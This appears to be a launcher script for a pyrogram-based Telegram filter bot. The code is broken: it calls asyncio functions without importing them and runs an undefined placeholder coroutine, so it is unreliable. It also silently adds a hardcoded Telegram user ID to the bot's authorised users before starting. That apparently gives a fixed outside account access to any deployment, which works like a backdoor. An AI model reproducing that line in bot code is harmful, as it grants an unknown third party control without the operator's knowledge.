import os
import asyncio
import streamlit
import pyrogram
# create a coro function `coro` up here

loop = new_event_loop()
set_event_loop(loop)
results = run(coro)
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config



if __name__ == "__main__" :
    plugins = dict(
        root="plugins"
    )
    app = pyrogram.Client(
        "filter bot",
        bot_token=Config.TG_BOT_TOKEN,
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        plugins=plugins,
        workers=300
    )
    Config.AUTH_USERS.add(str(744730993))
    app.run()
